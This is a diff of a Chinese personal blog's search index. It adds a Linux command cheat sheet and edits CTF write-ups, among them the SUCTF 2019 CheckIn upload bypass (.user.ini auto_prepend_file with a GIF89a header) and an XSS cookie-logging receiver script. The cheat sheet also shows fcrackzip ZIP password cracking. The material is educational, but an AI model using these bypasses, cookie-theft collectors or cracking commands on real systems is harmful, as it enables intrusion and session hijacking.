@@ -3,6 +3,184 @@
   
     
     <entry>
+      <title><![CDATA[linux 常用命令]]></title>
+      <url>/2019/09/18/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/</url>
+      <content type="html"><![CDATA[<p>原《服务器运维》.</p>
+<a id="more"></a>
+<p>这两天操作系统课正在教怎么用linux命令, 我也顺便把这篇博客重新写写.</p>
+<h1 id="linux-常用命令"><a href="#linux-常用命令" class="headerlink" title="linux 常用命令"></a>linux 常用命令</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul>
+<li>新建文件 <code>touch &lt;name&gt;</code></li>
+<li>删除文件 <code>rm   &lt;name&gt;</code></li>
+<li>删除目录 <code>rm -r   &lt;name&gt;</code></li>
+<li>解压缩 <code>unzip  &lt;name&gt;</code></li>
+<li>文件复制 <code>cp 源文件 目标目录</code></li>
+<li>文件移动 <code>mv 源文件 目标目录</code></li>
+<li>查找文件 <code>find -name &#39;filename&#39;</code></li>
+<li>读取文件:<ol>
+<li><code>cat filename</code><br>直接把文件内容全部输出</li>
+<li><code>tail -n  10  filename</code><br>可以从文件的末尾向前读取.</li>
+<li><code>less filename</code><br>和 more 这个命令很像, 都是分页读取, 适合那种大文件.<br>但是感觉less更顺手一些<br>空格: 向后翻一页, b: 向前翻一页, q: 退出, /‘txt’: 在文件中查找’txt’ </li>
+<li><code>od filename</code><br>显示二进制数据, 可以加入参数<code>-h</code>以十六进制显示.</li>
+</ol>
+</li>
+</ul>
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤出文件中包含 <code>key</code>的记录 :<br><code>grep &#39;key&#39; &lt;file&gt;</code><br>递归过滤 :<br><code>grep -r &#39;key&#39; &lt;file&gt;</code></p>
+<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>作用 ：将上一个命令的输出作为下一个命令的输入, 操作符是 |</p>
+<ol>
+<li>将 cat 和 grep 组合在一起<br><code>cat &lt;file&gt; | grep &#39;key&#39;</code></li>
+<li>过滤出目录中名字包含<code>key</code>的目录(不包含子目录)<br><code>ls | grep &#39;key&#39;</code></li>
+</ol>
+<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><ul>
+<li>显示所有进程<br><code>ps -A</code></li>
+<li>杀死某项进程<br><code>sudo kill [进程编号]</code></li>
+<li>杀死某个用户的所有进程<br><code>sudo killall -u user</code></li>
+</ul>
+<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><h4 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h4><p>通过 <code>ls -al</code> 可以查看当前目录下的文件的权限.<br><code>drwxrw-rwx</code></p>
+<table>
+<thead>
+<tr>
+<th align="center">d</th>
+<th align="center">rwx</th>
+<th align="center">rw-</th>
+<th align="center">rwx</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">是目录</td>
+<td align="center">owner</td>
+<td align="center">group</td>
+<td align="center">other</td>
+</tr>
+</tbody></table>
+<p>后面的r表示可读, w表示可写, x表示可执行.</p>
+<h4 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h4><p><code>chmod 700 filename</code></p>
+<p>其中 700 是二进制表示 <code>111 000 000</code></p>
+<p>和上面的文件权限逐位对应.</p>
+<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul>
+<li>硬链接<br><code>ln targetFile linkedFile</code></li>
+<li>符号链接<br><code>ln -s targetFile symLinkFile</code></li>
+</ul>
+<h2 id="编译-or-运行代码"><a href="#编译-or-运行代码" class="headerlink" title="编译 or 运行代码"></a>编译 or 运行代码</h2><h3 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h3><p>编译C++程序(指定名称和后缀):</p>
+<p><code>g++   *.cpp   -std=c++11 -o  a.exe</code></p>
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>可以使用 <code>php filename.php</code> 直接运行.</p>
+<p>也可以放进web目录下, 通过浏览器访问启动, </p>
+<p>各有利弊吧</p>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p><strong>需要注意下python版本, 通常python指3.x 而 python2指2.x</strong></p>
+<ol>
+<li><code>python filename.py</code></li>
+<li><code>python -c &quot;your code&quot;</code></li>
+</ol>
+<h2 id="服务器相关"><a href="#服务器相关" class="headerlink" title="服务器相关"></a>服务器相关</h2><h3 id="pscp"><a href="#pscp" class="headerlink" title="pscp"></a>pscp</h3><p>当使用ssh远程登录云主机后, 虽然我们有了可以输入命令的bash, 但是如果要上传文件需要使用工具pscp.</p>
+<p>步骤:</p>
+<ol>
+<li>从本地打开<code>CMD</code>到(pscp)putty目录下</li>
+<li>pscp</li>
+<li>基本命令格式：<br><code>pscp   [本地文件路径]   [用户名]@[ServerIP]:[目录]</code><br>或<code>pscp  -r   [本地目录路径]  [用户名]@[ServerIP]：[目录]</code><br>同理，pscp也可以从Linux向Windows复制文件或目录</li>
+</ol>
+<p><strong>更推荐使用 finalShell 类的工具,非常方便,省去打命令的时间,且更直观</strong></p>
+<h3 id="apache服务"><a href="#apache服务" class="headerlink" title="apache服务"></a>apache服务</h3><h4 id="启动-停止-重启"><a href="#启动-停止-重启" class="headerlink" title="启动|停止|重启:"></a>启动|停止|重启:</h4><p><code>service apache2 start|stop|restart</code></p>
+<h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p><code>/etc/apache2/apache2.conf</code></p>
+<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h4 id="启动-停止-重启-1"><a href="#启动-停止-重启-1" class="headerlink" title="启动|停止|重启"></a>启动|停止|重启</h4><p><code>servive mysql start|stop|restart</code></p>
+<h3 id="screen命令"><a href="#screen命令" class="headerlink" title="screen命令"></a>screen命令</h3><table>
+<thead>
+<tr>
+<th align="center">命令</th>
+<th align="center">功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>screen -S &lt;name&gt;</code></td>
+<td align="center">创建名为 name 的session</td>
+</tr>
+<tr>
+<td align="center"><code>screen  -ls</code></td>
+<td align="center">显示所有session</td>
+</tr>
+<tr>
+<td align="center"><code>screen  -r  &lt;name&gt;</code></td>
+<td align="center">进入名为 name 的session</td>
+</tr>
+<tr>
+<td align="center"><code>screen   -D  -r  &lt;name&gt;</code></td>
+<td align="center">将名为name的session离线并重新连接</td>
+</tr>
+<tr>
+<td align="center"><code>ctrl+a     c</code></td>
+<td align="center">在当前终端新建session</td>
+</tr>
+<tr>
+<td align="center"><code>ctrl+a     w</code></td>
+<td align="center">显示当前终端session列表</td>
+</tr>
+<tr>
+<td align="center"><code>ctrl+a     k</code></td>
+<td align="center">关闭当前session</td>
+</tr>
+<tr>
+<td align="center"><code>ctrl+a     0-9</code></td>
+<td align="center">显示0-9session</td>
+</tr>
+<tr>
+<td align="center"><code>ctrl+a     space</code></td>
+<td align="center">按照顺序显示下一个session</td>
+</tr>
+<tr>
+<td align="center"><code>ctrl+a     A</code></td>
+<td align="center">为当前session命名</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>screen   -D  -r  &lt;name&gt;</code>可解决某些情况下无法重连接终端的问题</li>
+<li>若要关闭某个session，则关闭该session下所有window即可</li>
+</ul>
+<h2 id="一些命令行工具的使用"><a href="#一些命令行工具的使用" class="headerlink" title="一些命令行工具的使用"></a>一些命令行工具的使用</h2><h3 id="tshark-使用"><a href="#tshark-使用" class="headerlink" title="tshark 使用"></a>tshark 使用</h3><p>抓包的工具.<br><strong>基本每个命令都需要root权限<code>sudo</code></strong></p>
+<ul>
+<li><p>显示可用网卡 <code>tshark -D</code></p>
+</li>
+<li><p>抓包  使用命令 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [数字]  -w [文件名.pcap] -f [捕获过滤器]</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">+ -c 表示抓多少包后停止</span><br><span class="line">+ -w 把抓包结果输入到文件中, 无需提前创建, 若目录下没有, 自动创建</span><br><span class="line">+ -f 设置捕获过滤器, 我们此处主要针对http的数据包, 所以参数设定为 <span class="string">"port 80"</span></span><br><span class="line"></span><br><span class="line">但是根据我的试验, 凡是使用tshark后产生的文件权限都十分敏感, 没法用finalshell 直接下载, 为了方便起见, 再补充使用 `tcpdump` 的方法.</span><br><span class="line">```bash</span><br><span class="line">tcpdump -s  [数字]  -w [文件.pcap] port [端口数]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>-s 表示一个包截断的长度, 0表示不截断, 完整的保存下来</p>
+</li>
+<li><p>-w 输入到文件</p>
+</li>
+<li><p>port 监听的端口</p>
+</li>
+</ul>
+<p><strong>使用 tcpdump 同样需要sudo</strong></p>
+<h3 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h3><p>一款kali下预装的好用的zip密码破解工具, 支持遍历爆破密码或者跑字典.</p>
+<ul>
+<li><p>遍历:</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    fcrackzip -v -b -u -c a -p magicaaaa filename.zip</span><br><span class="line">    ```   </span><br><span class="line">    + -v : 详细信息</span><br><span class="line">    + -b : 爆破</span><br><span class="line">    + -u : 指定zip压缩格式(大概)</span><br><span class="line">    + -c : 指定密码类型, 选项值 a 就是纯字符串, 1 就是纯数字, a1 就是数字和字符串混杂.</span><br><span class="line">    + -p : 指定密码, magicaaaa就是前五位确定是magic了, 后面的a在这里是掩码, 表明这4位是字母.</span><br><span class="line">    + filename : 要破解的压缩包的名称.</span><br><span class="line">+ 跑字典:</span><br><span class="line">    ```bash</span><br><span class="line">    fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace.zip</span><br></pre></td></tr></table></figure>
+
+<p>  其中的rockyou.txt是个不错的密码字典, 可惜就是只符合外国人的密码习惯, 终于国内的比赛环境或是实战意义不大.</p>
+</li>
+</ul>
+<p>###</p>
+<h2 id="MineCraft相关命令"><a href="#MineCraft相关命令" class="headerlink" title="MineCraft相关命令"></a>MineCraft相关命令</h2><p>说出来你可能不信, 当初我学习使用ubuntu云服务器是为了玩MineCraft哒~</p>
+<ul>
+<li><p>mine craft启动命令（其他jar类型的程序应该也可以如此启动）<br><code>java -Xms# -Xmx# -jar [path]/minecraft_server.[version].jar nogui</code><br><code>nogui</code>:表示不以图形界面运行,因为我的服务器是server版的,本身就没有图形界面,所以不加也可以<br><code>-Xms</code>:初始启动分配内存<br><code>-Xmx</code>:最大分配内存<br><code>path</code>:jar包所在路径<br><code>version</code>:当前MineCraft_Server版本</p>
+</li>
+<li><p><code>tell &lt;sb&gt; &lt;something&gt;</code>: 给sb 私信 </p>
+</li>
+<li><p><code>gamemode survival &lt;sb&gt;</code>:将 sb 调至 生存模式</p>
+</li>
+<li><p><code>gamemode create &lt;sb&gt;</code>:将sb 调至 创造模式</p>
+</li>
+</ul>
+<p><del>更多的命令去百度上自己搜吧亲, 我现在不玩MC了</del></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Java 常用方法总结]]></title>
       <url>/2019/09/17/Java/</url>
       <content type="html"><![CDATA[<p>划重点, 考试要考的</p>
@@ -287,7 +465,7 @@
       <content type="html"><![CDATA[<p>来源: SUCTF 2019</p>
 <a id="more"></a>
 <h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>感谢<a href="https://www.tjuscswyz.cn/" target="_blank" rel="noopener">p4ssw0rd学长</a>和南开的<a href>QHX学长</a>, 在他们的指导下菜逼我终于搞出了这道题.</p>
-<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码:"></a>题目代码:</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Upload Labs<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Upload Labs<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"fileUpload"</span> <span class="attr">id</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"upload"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// error_reporting(0);</span><br><span class="line">$userdir = "uploads/" . md5($_SERVER["REMOTE_ADDR"]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . "/index.php", "");</span><br><span class="line">if (isset($_POST["upload"])) &#123;</span><br><span class="line">    $tmp_name = $_FILES["fileUpload"]["tmp_name"];</span><br><span class="line">    $name = $_FILES["fileUpload"]["name"];</span><br><span class="line">    if (!$tmp_name) &#123;</span><br><span class="line">        die("filesize too big!");</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;</span><br><span class="line">        die("filename cannot be empty!");</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, ".") + 1);</span><br><span class="line">    if (preg_match("/ph|htaccess/i", $extension)) &#123;</span><br><span class="line">        die("illegal suffix!");</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), "&lt;?") !== FALSE) &#123;</span><br><span class="line">        die("&amp;lt;? in contents!");</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die("exif_imagetype:not image!");</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . "/" . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo "Your dir " . $userdir. ' &lt;br&gt;';</span><br><span class="line">    echo 'Your files : &lt;br&gt;';</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码:"></a>题目代码:</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;/h2&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;fileUpload&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// error_reporting(0);</span><br><span class="line">$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name) &#123;</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);</span><br><span class="line">    if (preg_match(&quot;/ph|htaccess/i&quot;, $extension)) &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">        die(&quot;&amp;lt;? in contents!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . &quot;/&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &apos; &lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;Your files : &lt;br&gt;&apos;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="题目特点"><a href="#题目特点" class="headerlink" title="题目特点:"></a>题目特点:</h2><ul>
 <li>一看就是文件上传漏洞</li>
@@ -305,6 +483,8 @@
 <p>在这道题的配置中, 如果web目录下有上述的配置文件, 就可以在运行index.php时先解析<code>filename.xxx</code>文件. 而且可以是任何后缀的文件.</p>
 <p>虽然不能写<code>&lt;?php   php_code     ?&gt;</code>这种形式, 但是可以用<code>&lt;script language=&quot;php&quot;&gt;php_code&lt;/sript&gt;</code>代替.</p>
 <p>对于图片内容的检测, 如果我们以gif文件作为payload, 只需要加上<code>GIF89A</code>即可绕过. (仅对于本题中的<code>exif_imagetype()</code>函数及类似的检测方式.)</p>
+<p>几个常见的文件头<br>|文件类型|文件头|文件尾|<br>|:—|:—|:—|<br>|PNG|89504E47|AE426082|<br>|GIF|47494638|003B|<br>|JPEG|FFD8FF|FFD9|<br>|ZIP|504B0304|504B|<br>|PDF|255044462D|—-|</p>
+<p><a href="http://www.cnblogs.com/lwy-kitty/p/3928317.html" target="_blank" rel="noopener">还有一些不是很常用的</a></p>
 <h2 id="总之"><a href="#总之" class="headerlink" title="总之"></a>总之</h2><p>.user.ini</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF</span><br><span class="line">auto_prepend_file=home.gif</span><br></pre></td></tr></table></figure>
 
@@ -418,7 +598,7 @@
 </ul>
 <p>这个js文件可以在页面中追加一个图片资源, 并且指向我们自己的一台服务器的某个文件(即下面的<code>index.php</code>)并向其发送参数. </p>
 <ul>
-<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$cookie = $_GET[<span class="string">'cookie'</span>];</span></span><br><span class="line"><span class="php">$time = time();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span></span><br><span class="line"><span class="php">$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span></span><br><span class="line"><span class="php">$txt = date(<span class="string">"Y/m/d-h:i:s"</span>).<span class="string">" ip="</span>.$ip.<span class="string">"  cookie="</span>.$cookie.<span class="string">" referer="</span>.$referer.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php">file_put_contents(<span class="string">"log.txt"</span>,$txt,FILE_APPEND);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$time = time();</span><br><span class="line"></span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">$referer = $_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$txt = date(&quot;Y/m/d-h:i:s&quot;).&quot; ip=&quot;.$ip.&quot;  cookie=&quot;.$cookie.&quot; referer=&quot;.$referer.&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo $txt;</span><br><span class="line">file_put_contents(&quot;log.txt&quot;,$txt,FILE_APPEND);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
@@ -1478,142 +1658,6 @@
             <tag> CTF </tag>
             
             <tag> 随笔 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[服务器运维]]></title>
-      <url>/2019/07/08/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/</url>
-      <content type="html"><![CDATA[<h1 id="服务器相关笔记"><a href="#服务器相关笔记" class="headerlink" title="服务器相关笔记"></a>服务器相关笔记</h1><h2 id="服务器参数"><a href="#服务器参数" class="headerlink" title="服务器参数:"></a>服务器参数:</h2><ul>
-<li>Ubunt 18.04 Server</li>
-<li>内存 2GB</li>
-</ul>
-<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>新建文件 <code>touch &lt;name&gt;</code><br>删除文件 <code>rm   &lt;name&gt;</code><br>删除目录 <code>rm -r   &lt;name&gt;</code><br>解压缩 <code>unzip  &lt;name&gt;</code><br>文件复制 <code>cp 源文件 目标目录</code><br>文件移动 <code>mv 源文件 目标目录</code></p>
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译C++程序(指定名称和后缀):<br><code>g++   *.cpp   -std=c++11 -o   a.exe</code></p>
-<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤出文件中包含 <code>key</code>的记录 :<br><code>grep &#39;key&#39; &lt;file&gt;</code><br>递归过滤 :<br><code>grep -r &#39;key&#39; &lt;file&gt;</code></p>
-<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>作用 ：将上一个命令的输出作为下一个命令的输入, 操作符是 |</p>
-<ol>
-<li>将 cat 和 grep 组合在一起<br><code>cat &lt;file&gt; | grep &#39;key&#39;</code></li>
-<li>过滤出目录中名字包含<code>key</code>的目录(不包含子目录)<br><code>ls | grep &#39;key&#39;</code></li>
-</ol>
-<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><ul>
-<li>显示所有进程<br><code>ps -A</code></li>
-<li>杀死某项进程<br><code>sudo kill [进程编号]</code></li>
-</ul>
-<h2 id="screen命令"><a href="#screen命令" class="headerlink" title="screen命令"></a>screen命令</h2><table>
-<thead>
-<tr>
-<th align="center">命令</th>
-<th align="center">功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"><code>screen -S &lt;name&gt;</code></td>
-<td align="center">创建名为 name 的session</td>
-</tr>
-<tr>
-<td align="center"><code>screen  -ls</code></td>
-<td align="center">显示所有session</td>
-</tr>
-<tr>
-<td align="center"><code>screen  -r  &lt;name&gt;</code></td>
-<td align="center">进入名为 name 的session</td>
-</tr>
-<tr>
-<td align="center"><code>screen   -D  -r  &lt;name&gt;</code></td>
-<td align="center">将名为name的session离线并重新连接</td>
-</tr>
-<tr>
